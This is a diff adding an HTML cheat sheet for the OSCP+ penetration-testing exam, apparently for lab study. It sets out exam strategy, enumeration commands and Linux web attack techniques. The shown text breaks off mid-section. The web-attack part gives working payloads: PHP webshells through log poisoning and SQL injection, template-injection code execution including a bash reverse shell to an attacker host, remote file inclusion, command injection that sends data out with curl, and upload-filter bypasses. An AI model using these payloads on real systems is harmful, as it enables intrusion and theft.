@@ -1,0 +1,1939 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP+ Complete Exam Checklist & Attack Chains 2025-26</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:        #090b0f;
+    --bg2:       #0d1017;
+    --bg3:       #111520;
+    --panel:     #131824;
+    --border:    #1e2535;
+    --accent:    #00ff88;
+    --accent2:   #00b8ff;
+    --accent3:   #ff4c6a;
+    --accent4:   #ffb800;
+    --text:      #c8d3e8;
+    --text-dim:  #5c6880;
+    --text-mid:  #8896b3;
+    --code-bg:   #0b0e16;
+    --code-border:#1a2235;
+    --glow:      0 0 20px rgba(0,255,136,0.15);
+    --glow2:     0 0 20px rgba(0,184,255,0.15);
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background-color: var(--bg);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13.5px;
+    line-height: 1.75;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* ─── Noise + grid background ─── */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(0,255,136,0.02) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,255,136,0.02) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(0,184,255,0.05) 0%, transparent 70%),
+                radial-gradient(ellipse 60% 40% at 80% 100%, rgba(0,255,136,0.04) 0%, transparent 60%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* ─── Layout ─── */
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 0 24px 80px;
+  }
+
+  /* ─── Header ─── */
+  header {
+    padding: 60px 0 40px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 48px;
+    position: relative;
+  }
+
+  .header-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(0,255,136,0.08);
+    border: 1px solid rgba(0,255,136,0.25);
+    color: var(--accent);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    padding: 5px 14px;
+    border-radius: 3px;
+    margin-bottom: 22px;
+  }
+
+  .header-badge::before { content: '●'; animation: blink 1.5s infinite; }
+
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
+
+  h1 {
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    font-size: clamp(26px, 4vw, 44px);
+    line-height: 1.1;
+    letter-spacing: -1px;
+    color: #fff;
+    margin-bottom: 16px;
+  }
+
+  h1 span { color: var(--accent); }
+
+  .meta-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 16px;
+    margin-top: 20px;
+  }
+
+  .meta-pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    font-size: 11.5px;
+    padding: 5px 12px;
+    border-radius: 4px;
+  }
+
+  .meta-pill .val { color: var(--accent4); font-weight: 700; }
+  .meta-pill.red .val { color: var(--accent3); }
+  .meta-pill.blue .val { color: var(--accent2); }
+
+  /* ─── Warning banner ─── */
+  .warning-banner {
+    background: rgba(255,76,106,0.08);
+    border: 1px solid rgba(255,76,106,0.35);
+    border-left: 3px solid var(--accent3);
+    border-radius: 4px;
+    padding: 14px 18px;
+    color: #f08090;
+    font-size: 12.5px;
+    margin-bottom: 40px;
+  }
+
+  .warning-banner strong { color: var(--accent3); }
+
+  /* ─── TOC ─── */
+  .toc {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-top: 2px solid var(--accent2);
+    border-radius: 6px;
+    padding: 28px 32px;
+    margin-bottom: 56px;
+  }
+
+  .toc-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--accent2);
+    margin-bottom: 18px;
+  }
+
+  .toc ol {
+    list-style: none;
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+    gap: 4px 32px;
+    counter-reset: toc;
+  }
+
+  .toc li { counter-increment: toc; }
+
+  .toc a {
+    text-decoration: none;
+    color: var(--text-mid);
+    font-size: 12.5px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 4px 0;
+    transition: color 0.2s;
+  }
+
+  .toc a::before {
+    content: counter(toc, decimal-leading-zero);
+    color: var(--text-dim);
+    font-size: 10px;
+    min-width: 22px;
+  }
+
+  .toc a:hover { color: var(--accent); }
+
+  /* ─── Sections ─── */
+  .section {
+    margin-bottom: 64px;
+    scroll-margin-top: 20px;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin-bottom: 28px;
+    padding-bottom: 14px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-num {
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    font-size: 11px;
+    letter-spacing: 2px;
+    color: var(--text-dim);
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 4px 10px;
+    border-radius: 3px;
+    white-space: nowrap;
+  }
+
+  h2 {
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    font-size: 20px;
+    color: #fff;
+    letter-spacing: -0.3px;
+  }
+
+  h3 {
+    font-family: 'Syne', sans-serif;
+    font-weight: 600;
+    font-size: 14px;
+    color: var(--accent2);
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    margin: 28px 0 12px;
+  }
+
+  h4 {
+    font-family: 'Syne', sans-serif;
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--accent4);
+    margin: 20px 0 8px;
+  }
+
+  p { color: var(--text-mid); font-size: 13px; margin-bottom: 10px; }
+
+  /* ─── Code blocks ─── */
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--code-border);
+    border-radius: 6px;
+    padding: 20px 22px;
+    overflow-x: auto;
+    margin: 12px 0 20px;
+    position: relative;
+    font-size: 12.5px;
+    line-height: 1.8;
+  }
+
+  pre::before {
+    content: attr(data-lang);
+    position: absolute;
+    top: 8px;
+    right: 12px;
+    font-size: 10px;
+    letter-spacing: 1.5px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+  }
+
+  code { font-family: 'JetBrains Mono', monospace; color: #e0eaff; }
+
+  pre code {
+    color: #c8d3e8;
+  }
+
+  /* syntax-ish coloring */
+  pre .c  { color: #4a5568; }   /* comments */
+  pre .kw { color: var(--accent2); font-weight: 500; }
+  pre .str{ color: var(--accent); }
+  pre .cm { color: var(--accent4); }
+  pre .op { color: var(--accent3); }
+
+  /* Inline code */
+  p code, li code {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    padding: 1px 6px;
+    font-size: 12px;
+    color: var(--accent);
+  }
+
+  /* ─── Tables ─── */
+  .table-wrap { overflow-x: auto; margin: 12px 0 20px; border-radius: 6px; border: 1px solid var(--border); }
+
+  table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
+
+  thead tr { background: var(--bg3); }
+  thead th {
+    padding: 12px 16px;
+    text-align: left;
+    color: var(--accent2);
+    font-weight: 600;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    font-size: 11px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  tbody tr { border-bottom: 1px solid rgba(30,37,53,0.7); transition: background 0.15s; }
+  tbody tr:last-child { border-bottom: none; }
+  tbody tr:hover { background: rgba(0,255,136,0.03); }
+  td { padding: 10px 16px; color: var(--text); vertical-align: top; }
+  td:first-child { color: var(--accent4); font-weight: 500; white-space: nowrap; }
+  td .action { color: var(--accent2); }
+  td .impact { color: var(--accent3); }
+
+  /* ─── Point boxes ─── */
+  .points-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+    gap: 12px;
+    margin: 12px 0 24px;
+  }
+
+  .point-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px 18px;
+  }
+
+  .point-card .label { font-size: 11px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; }
+  .point-card .pts { font-family: 'Syne', sans-serif; font-size: 26px; font-weight: 800; color: var(--accent); line-height: 1.1; }
+  .point-card .pts.blue { color: var(--accent2); }
+  .point-card .pts.yellow { color: var(--accent4); }
+  .point-card .sublabel { font-size: 11px; color: var(--text-mid); margin-top: 2px; }
+
+  /* ─── Info callout ─── */
+  .callout {
+    background: rgba(0,184,255,0.06);
+    border: 1px solid rgba(0,184,255,0.22);
+    border-left: 3px solid var(--accent2);
+    border-radius: 4px;
+    padding: 14px 18px;
+    margin: 16px 0;
+    font-size: 12.5px;
+    color: #90b8e0;
+  }
+
+  .callout.green {
+    background: rgba(0,255,136,0.05);
+    border-color: rgba(0,255,136,0.2);
+    border-left-color: var(--accent);
+    color: #80d8a8;
+  }
+
+  .callout.red {
+    background: rgba(255,76,106,0.06);
+    border-color: rgba(255,76,106,0.22);
+    border-left-color: var(--accent3);
+    color: #f09090;
+  }
+
+  .callout strong { color: #fff; }
+
+  /* ─── Checklist ─── */
+  .checklist { list-style: none; }
+  .checklist li {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    padding: 5px 0;
+    color: var(--text-mid);
+    font-size: 12.5px;
+    border-bottom: 1px solid rgba(30,37,53,0.4);
+  }
+
+  .checklist li::before {
+    content: '☐';
+    color: var(--text-dim);
+    flex-shrink: 0;
+    margin-top: 1px;
+  }
+
+  .checklist li.done::before { content: '☑'; color: var(--accent); }
+
+  /* ─── Decision tree box ─── */
+  .tree-box {
+    background: var(--code-bg);
+    border: 1px solid var(--code-border);
+    border-radius: 6px;
+    padding: 20px 24px;
+    font-size: 12px;
+    line-height: 1.9;
+    color: #8fa8c8;
+    white-space: pre;
+    overflow-x: auto;
+    margin: 12px 0 20px;
+  }
+
+  .tree-box .root { color: var(--accent); font-weight: 700; }
+  .tree-box .leaf { color: var(--accent2); }
+  .tree-box .win  { color: var(--accent); font-weight: 600; }
+  .tree-box .note { color: var(--text-dim); }
+
+  /* ─── Scenario blocks ─── */
+  .scenario-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 10px;
+    margin: 12px 0 20px;
+  }
+
+  .scenario {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    padding: 14px 16px;
+    font-size: 12px;
+  }
+
+  .scenario .sc-label { color: var(--accent4); font-weight: 700; font-size: 11px; letter-spacing: 1px; margin-bottom: 4px; }
+  .scenario .sc-pts { font-family: 'Syne', sans-serif; font-size: 20px; font-weight: 800; color: var(--accent); }
+  .scenario .sc-desc { color: var(--text-mid); font-size: 11.5px; margin-top: 4px; }
+
+  /* ─── Back to top ─── */
+  .back-top {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 11px;
+    color: var(--text-dim);
+    text-decoration: none;
+    border: 1px solid var(--border);
+    padding: 5px 12px;
+    border-radius: 3px;
+    margin-top: 20px;
+    transition: color 0.2s, border-color 0.2s;
+  }
+
+  .back-top:hover { color: var(--accent); border-color: var(--accent); }
+
+  /* ─── Divider ─── */
+  hr { border: none; border-top: 1px solid var(--border); margin: 40px 0; }
+
+  /* ─── Footer ─── */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 32px 0 0;
+    margin-top: 60px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 12px;
+    font-size: 11.5px;
+    color: var(--text-dim);
+  }
+
+  footer span { color: var(--accent); }
+
+  /* ─── Scrollbar ─── */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--accent2); }
+
+  /* ─── Selection ─── */
+  ::selection { background: rgba(0,255,136,0.2); color: #fff; }
+</style>
+</head>
+<body>
+<div class="wrapper">
+
+<!-- ═══════════════════ HEADER ═══════════════════ -->
+<header id="top">
+  <div class="header-badge">LIVE</div>
+  <h1>OSCP<span>+</span> Complete Exam Checklist<br>&amp; Attack Chains</h1>
+  <div class="meta-row">
+    <div class="meta-pill">Edition <span class="val">PEN-200 v2025-26</span></div>
+    <div class="meta-pill">Format <span class="val">3 Standalone + 1 AD Set</span></div>
+    <div class="meta-pill red">Pass Score <span class="val">70 / 100 pts</span></div>
+    <div class="meta-pill blue">AD Set <span class="val">ASSUMED BREACH</span></div>
+  </div>
+</header>
+
+<div class="warning-banner">
+  ⚠ <strong>ASSUMED BREACH — AD Set:</strong> Credentials are provided at exam start. You begin as a low-privilege domain user. Enumerate immediately with those creds.
+</div>
+
+<!-- ═══════════════════ TOC ═══════════════════ -->
+<nav class="toc">
+  <div class="toc-title">// Table of Contents</div>
+  <ol>
+    <li><a href="#s1">Exam Structure &amp; Strategy</a></li>
+    <li><a href="#s2">Universal Enumeration Framework</a></li>
+    <li><a href="#s3">Standalone Linux Box Methodology</a></li>
+    <li><a href="#s4">Standalone Windows Box Methodology</a></li>
+    <li><a href="#s5">Active Directory Attack Chains</a></li>
+    <li><a href="#s6">MSSQL — RCE &amp; Lateral Movement</a></li>
+    <li><a href="#s7">Pivoting &amp; Tunneling</a></li>
+    <li><a href="#s8">Password Attacks</a></li>
+    <li><a href="#s9">File Transfer Cheatsheet</a></li>
+    <li><a href="#s10">Shells &amp; Upgrades</a></li>
+    <li><a href="#s11">Exploit Development (BOF Reference)</a></li>
+    <li><a href="#s12">Common CVEs &amp; Exploits</a></li>
+    <li><a href="#s13">Exam Day Tips</a></li>
+    <li><a href="#s14">Proof Collection Checklist</a></li>
+    <li><a href="#s15">Quick Reference Card</a></li>
+  </ol>
+</nav>
+
+<!-- ═══════════════════ S1 ═══════════════════ -->
+<section class="section" id="s1">
+  <div class="section-header">
+    <span class="section-num">01</span>
+    <h2>Exam Structure &amp; Strategy</h2>
+  </div>
+
+  <h3>Point Breakdown</h3>
+  <div class="points-grid">
+    <div class="point-card">
+      <div class="label">AD Set Total</div>
+      <div class="pts">40 pts</div>
+    </div>
+    <div class="point-card">
+      <div class="label">MS01 — local.txt</div>
+      <div class="pts blue">10 pts</div>
+      <div class="sublabel">Entry point (provided creds)</div>
+    </div>
+    <div class="point-card">
+      <div class="label">MS02 — local.txt</div>
+      <div class="pts blue">10 pts</div>
+      <div class="sublabel">Pivot via MS01</div>
+    </div>
+    <div class="point-card">
+      <div class="label">DC01 — proof.txt</div>
+      <div class="pts yellow">20 pts</div>
+      <div class="sublabel">Requires DA / SYSTEM</div>
+    </div>
+    <div class="point-card">
+      <div class="label">Each Standalone</div>
+      <div class="pts">20 pts</div>
+      <div class="sublabel">local.txt=10 + proof.txt=10</div>
+    </div>
+    <div class="point-card" style="border-color:rgba(0,255,136,0.3);">
+      <div class="label">Pass Threshold</div>
+      <div class="pts" style="font-size:32px;">70</div>
+      <div class="sublabel">out of 100 pts</div>
+    </div>
+  </div>
+
+  <h3>Time Strategy (23h 45min)</h3>
+  <pre data-lang="timeline"><code>Hour 0-0:30    Setup: VPN, loot dirs, /etc/hosts, nmap ALL targets in parallel
+Hour 0:30-4    ATTACK AD SET FIRST — 40 pts guaranteed path
+               ├── Enumerate with provided creds (BloodHound, CME, LDAP)
+               ├── Low-hanging fruit: Kerberoast, AS-REP, descriptions, shares
+               ├── Lateral MS01 → MS02 → DC
+               └── Screenshot every proof immediately
+Hour 4-8       Standalone Box 1 (pick easiest from nmap)
+Hour 8-13      Standalone Box 2
+Hour 13-18     Standalone Box 3
+Hour 18-22     Revisit stuck machines with fresh eyes
+Hour 22-23     Final screenshots, verify all proofs, report notes</code></pre>
+
+  <h3>Minimum Pass Scenarios</h3>
+  <div class="scenario-grid">
+    <div class="scenario">
+      <div class="sc-label">Scenario A — Recommended</div>
+      <div class="sc-pts">80 pts ✓</div>
+      <div class="sc-desc">Full AD (40) + 2 full standalones (40)</div>
+    </div>
+    <div class="scenario">
+      <div class="sc-label">Scenario B</div>
+      <div class="sc-pts">70 pts ✓</div>
+      <div class="sc-desc">Full AD (40) + 1 full (20) + 1 local.txt (10)</div>
+    </div>
+    <div class="scenario">
+      <div class="sc-label">Scenario C</div>
+      <div class="sc-pts">70 pts ✓</div>
+      <div class="sc-desc">Full AD (40) + 2×local.txt (20) + 1 root (10)</div>
+    </div>
+    <div class="scenario">
+      <div class="sc-label">Scenario D — No AD</div>
+      <div class="sc-pts">70 pts ✓</div>
+      <div class="sc-desc">3 full standalones (60) + AD partial (10)</div>
+    </div>
+  </div>
+
+  <h3>Metasploit Rule</h3>
+  <pre data-lang="rule"><code>✓ msfvenom      → use freely on ALL machines (payload gen only)
+✓ Metasploit    → EXACTLY 1 machine — choose wisely
+✗ Metasploit    → CANNOT use on more than 1 machine
+✓ Manual exploits → unlimited</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S2 ═══════════════════ -->
+<section class="section" id="s2">
+  <div class="section-header">
+    <span class="section-num">02</span>
+    <h2>Universal Enumeration Framework</h2>
+  </div>
+
+  <h3>Initial Recon — Run in Parallel</h3>
+  <pre data-lang="bash"><code># Setup workspace
+mkdir -p ~/exam/{ad,box1,box2,box3}/{scans,loot,exploits,screenshots}
+
+# Parallel quick scans on ALL targets:
+for ip in &lt;MS01_IP&gt; &lt;MS02_IP&gt; &lt;DC_IP&gt; &lt;BOX1_IP&gt; &lt;BOX2_IP&gt; &lt;BOX3_IP&gt;; do
+    nmap -sV --open -T4 $ip -oN ~/exam/scans/quick_$ip.txt &amp;
+done; wait
+
+# Full TCP per machine:
+nmap -p- -sV -sC --open -T4 &lt;TARGET_IP&gt; -oN full_tcp.txt
+
+# UDP top 20 — DON'T SKIP (SNMP/TFTP/DNS often critical):
+nmap -sU --top-ports 20 &lt;TARGET_IP&gt; -oN udp.txt</code></pre>
+
+  <h3>Port → Action Decision Table</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Port</th><th>Service</th><th>Immediate Action</th></tr></thead>
+      <tbody>
+        <tr><td>21</td><td>FTP</td><td><span class="action">ftp &lt;IP&gt; (try anonymous:anonymous); check version → searchsploit</span></td></tr>
+        <tr><td>22</td><td>SSH</td><td><span class="action">Note version; use creds found later; id_rsa files?</span></td></tr>
+        <tr><td>25</td><td>SMTP</td><td><span class="action">smtp-user-enum; check open relay</span></td></tr>
+        <tr><td>53</td><td>DNS</td><td><span class="action">dig axfr @&lt;IP&gt; &lt;domain&gt;; dnsrecon zone transfer</span></td></tr>
+        <tr><td>80/443</td><td>HTTP/S</td><td><span class="action">→ Full web enumeration workflow below</span></td></tr>
+        <tr><td>88</td><td>Kerberos</td><td><span class="impact">AD confirmed! AS-REP roast immediately</span></td></tr>
+        <tr><td>111</td><td>RPC/NFS</td><td><span class="action">showmount -e &lt;IP&gt;; mount + explore</span></td></tr>
+        <tr><td>139/445</td><td>SMB</td><td><span class="action">→ SMB enumeration section below</span></td></tr>
+        <tr><td>161 UDP</td><td>SNMP</td><td><span class="action">snmpwalk -c public -v1; onesixtyone brute</span></td></tr>
+        <tr><td>389/636</td><td>LDAP</td><td><span class="action">ldapsearch anonymous; AD enumeration</span></td></tr>
+        <tr><td>1433</td><td>MSSQL</td><td><span class="impact">→ Full MSSQL section (Section 6)</span></td></tr>
+        <tr><td>3306</td><td>MySQL</td><td><span class="action">mysql -u root -h &lt;IP&gt; (blank/default pass)</span></td></tr>
+        <tr><td>3389</td><td>RDP</td><td><span class="action">Check ms17-010, BlueKeep; use creds</span></td></tr>
+        <tr><td>5985</td><td>WinRM</td><td><span class="action">evil-winrm -i &lt;IP&gt; -u user -p pass</span></td></tr>
+        <tr><td>8080/8443</td><td>Alt-HTTP</td><td><span class="action">Tomcat? Jenkins? Weblogic? check /manager</span></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Web Enumeration Workflow</h3>
+  <pre data-lang="bash"><code># 1. Tech fingerprint
+whatweb http://&lt;TARGET_IP&gt; -v
+curl -I http://&lt;TARGET_IP&gt;
+nikto -h http://&lt;TARGET_IP&gt; -output nikto.txt &amp;
+
+# 2. Directory brute force
+gobuster dir -u http://&lt;TARGET_IP&gt; \
+    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
+    -x php,html,txt,asp,aspx,jsp -t 50 -o gobuster.txt
+
+feroxbuster -u http://&lt;TARGET_IP&gt; \
+    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+    -x php,html,txt,aspx -t 100 --depth 3 -o ferox.txt
+
+# 3. Always manually check:
+curl http://&lt;TARGET_IP&gt;/robots.txt
+curl http://&lt;TARGET_IP&gt;/.git/HEAD
+curl http://&lt;TARGET_IP&gt;/.env
+curl http://&lt;TARGET_IP&gt;/backup/
+curl http://&lt;TARGET_IP&gt;/config.php
+view-source:http://&lt;TARGET_IP&gt;/           # HTML comments!
+
+# 4. VHost enumeration:
+gobuster vhost -u http://&lt;DOMAIN&gt; \
+    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+    --append-domain -t 50 -o vhosts.txt
+
+# 5. CMS-specific:
+wpscan --url http://&lt;TARGET_IP&gt; --enumerate u,p,t,cb,dbe --plugins-detection aggressive
+joomscan -u http://&lt;TARGET_IP&gt;
+
+# 6. Parameter fuzzing:
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+    -u "http://&lt;TARGET_IP&gt;/page.php?FUZZ=test" -fs 0 -mc 200,301,302,500</code></pre>
+
+  <h3>SMB Enumeration</h3>
+  <pre data-lang="bash"><code># Unauthenticated:
+smbclient -L //&lt;TARGET_IP&gt; -N
+smbmap -H &lt;TARGET_IP&gt; -u '' -p ''
+crackmapexec smb &lt;TARGET_IP&gt; -u '' -p '' --shares
+nmap --script smb-vuln* -p 445 &lt;TARGET_IP&gt;
+
+# Authenticated:
+crackmapexec smb &lt;TARGET_IP&gt; -u user -p pass --shares --users --groups --pass-pol
+smbmap -H &lt;TARGET_IP&gt; -u user -p pass -R
+smbclient //&lt;TARGET_IP&gt;/share -U 'user%pass'
+
+# Download all files recursively:
+smbclient //&lt;TARGET_IP&gt;/SHARE -U 'user%pass' -c 'recurse ON; prompt OFF; mget *'
+crackmapexec smb &lt;TARGET_IP&gt; -u user -p pass -M spider_plus</code></pre>
+
+  <h3>SNMP Enumeration</h3>
+  <pre data-lang="bash"><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt &lt;TARGET_IP&gt;
+snmpwalk -c public -v2c &lt;TARGET_IP&gt; 1.3.6.1.2.1.25.4.2.1.2   # Running processes
+snmpwalk -c public -v2c &lt;TARGET_IP&gt; 1.3.6.1.2.1.25.6.3.1.2   # Installed software
+snmpwalk -c public -v2c &lt;TARGET_IP&gt; 1.3.6.1.4.1.77.1.2.25    # Windows users
+snmp-check &lt;TARGET_IP&gt; -c public</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S3 ═══════════════════ -->
+<section class="section" id="s3">
+  <div class="section-header">
+    <span class="section-num">03</span>
+    <h2>Standalone Linux Box Methodology</h2>
+  </div>
+
+  <h3>Linux Web Attack Techniques</h3>
+
+  <h4>LFI / Local File Inclusion</h4>
+  <pre data-lang="bash"><code># Basic traversal:
+/page.php?file=../../../../etc/passwd
+/page.php?file=../../../../etc/shadow
+/page.php?file=/proc/self/environ
+
+# PHP wrappers:
+/page.php?file=php://filter/convert.base64-encode/resource=config.php
+# Decode: echo '&lt;BASE64&gt;' | base64 -d
+
+# Log Poisoning → RCE:
+# Step 1: Inject PHP into Apache log via User-Agent:
+curl -A '&lt;?php system($_GET["cmd"]); ?&gt;' http://&lt;TARGET_IP&gt;/
+# Step 2: Include log file:
+/page.php?file=/var/log/apache2/access.log&amp;cmd=id
+
+# SSH log poisoning:
+ssh '&lt;?php system($_GET["cmd"]); ?&gt;'@&lt;TARGET_IP&gt;
+/page.php?file=/var/log/auth.log&amp;cmd=whoami</code></pre>
+
+  <h4>SQL Injection</h4>
+  <pre data-lang="bash"><code># Manual test: ' OR '1'='1'-- -
+# UNION read:
+' UNION SELECT 1,load_file('/etc/passwd'),3-- -
+# File write:
+' UNION SELECT 1,"&lt;?php system($_GET['cmd']); ?&gt;",3 INTO OUTFILE '/var/www/html/cmd.php'-- -
+
+# sqlmap:
+sqlmap -u "http://&lt;IP&gt;/login.php" --data="user=admin&amp;pass=x" --level=5 --risk=3 --dbs
+sqlmap -u "http://&lt;IP&gt;/item?id=1" --os-shell</code></pre>
+
+  <h4>SSTI — Server-Side Template Injection</h4>
+  <pre data-lang="bash"><code># Detection probes:
+{{7*7}}       → 49 = Jinja2/Twig
+${7*7}        → 49 = FreeMarker/Mako
+&lt;%= 7*7 %&gt;   → 49 = ERB (Ruby)
+
+# Jinja2 RCE:
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1"').read()}}
+
+# Twig RCE:
+{{['id']|filter('system')}}</code></pre>
+
+  <h4>RFI — Remote File Inclusion</h4>
+  <pre data-lang="bash"><code># Requires: allow_url_include=On in php.ini
+echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.txt
+python3 -m http.server 80
+/page.php?file=http://&lt;LHOST&gt;/shell.txt&amp;cmd=id</code></pre>
+
+  <h4>Blind SQLi — Time-Based</h4>
+  <pre data-lang="bash"><code># Detection (3s delay = vulnerable):
+http://target/page.php?id=1' AND IF(1=1,sleep(3),'false')-- -
+sqlmap -u "http://&lt;IP&gt;/page.php?id=1" --technique=T --level=3 --dbs</code></pre>
+
+  <h4>.git Exposed → Credential Chain</h4>
+  <pre data-lang="bash"><code>curl http://&lt;TARGET&gt;/.git/HEAD       # confirm exposed
+git-dumper http://&lt;TARGET&gt;/.git ./repo
+cd repo
+git log --oneline
+git show &lt;COMMIT_HASH&gt;              # deleted creds often here
+git diff HEAD~1 HEAD</code></pre>
+
+  <h4>Exiftool — Metadata → Usernames</h4>
+  <pre data-lang="bash"><code>exiftool *.jpg *.docx *.pdf 2&gt;/dev/null | grep -i "author\|creator\|owner"
+# Username found? Try as password on ALL services!</code></pre>
+
+  <h4>Archive / ZIP Cracking</h4>
+  <pre data-lang="bash"><code>zip2john protected.zip &gt; zip.hash
+john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
+office2john file.xlsx &gt; office.hash
+john office.hash --wordlist=rockyou.txt
+binwalk -e suspicious_file    # extract embedded files</code></pre>
+
+  <h4>MySQL UDF RCE (root creds + FILE priv)</h4>
+  <pre data-lang="bash"><code># Check:
+SELECT user, file_priv FROM mysql.user;
+SHOW variables LIKE 'plugin_dir';
+# Compile malicious UDF .so → upload → CREATE FUNCTION → system()
+# If MySQL local-only → SSH tunnel first:
+ssh -L 3306:127.0.0.1:3306 user@&lt;TARGET_IP&gt;
+mysql -u root -h 127.0.0.1 -P 3306 -p</code></pre>
+
+  <h4>Command Injection</h4>
+  <pre data-lang="bash"><code># Test chars: ; | || &amp;&amp; &amp; ` $() \n %0a
+ping=127.0.0.1; whoami
+ping=127.0.0.1|whoami
+ping=127.0.0.1`whoami`
+# URL encoded semicolon: %3B
+# Blind (OOB):
+ping=127.0.0.1; curl http://&lt;LHOST&gt;/?x=$(id|base64)</code></pre>
+
+  <h4>File Upload Bypass</h4>
+  <pre data-lang="bash"><code># 1. MIME: Change Content-Type to image/jpeg
+# 2. Magic bytes: GIF89a prepend
+# 3. Double ext: shell.php.jpg, shell.php%00.jpg
+# 4. Case: shell.pHp, shell.PHP
+# 5. Alt ext: .php3 .php4 .php5 .phtml .phar .shtml
+# 6. Null byte (older): shell.php%00.gif</code></pre>
+
+  <h3>Chained Attack Patterns — Standalone (Real OSCP Scenarios)</h3>
+  <div class="callout green">
+    <strong>Key Insight:</strong> OSCP boxes rarely have a single vulnerability. They chain 2-3 misconfigs. These are the most common patterns found in real exam/PG boxes.
+  </div>
+
+  <div class="tree-box"><span class="root">Chain A — Web Version CVE → Cred → Privesc</span>
+Apache/Nginx/App version found → searchsploit → RCE as www-data
+→ config.php has DB creds → reuse creds for SSH → sudo -l → ROOT
+
+<span class="root">Chain B — Anonymous SMB → Creds → RCE</span>
+SMB null session → readable share → config/pdf/xlsx file
+→ creds found → SSH/WinRM login → SUID/SeImpersonate → ROOT
+
+<span class="root">Chain C — LFI → SSH Key Read → Shell → Privesc</span>
+LFI at ?file= param → /home/user/.ssh/id_rsa → chmod 600 → SSH in
+→ sudo -l NOPASSWD → GTFObins → ROOT
+
+<span class="root">Chain D — Web Login → File Upload → Webshell → Cron Root</span>
+Default creds (admin:admin) → file upload → bypass (phar/phtml)
+→ webshell as www-data → /etc/crontab writable script → ROOT
+
+<span class="root">Chain E — LFI + PHP Filter → DB Creds → SQLi File Write → RCE</span>
+LFI + php://filter → base64 decode config.php → DB creds
+→ SQLi UNION INTO OUTFILE → webshell → shell → privesc
+
+<span class="root">Chain F — .git Exposed → Deleted Creds → SSH → sudo</span>
+/.git/HEAD accessible → git-dumper → git log/diff
+→ password found in old commit → SSH login → sudo privesc → ROOT
+
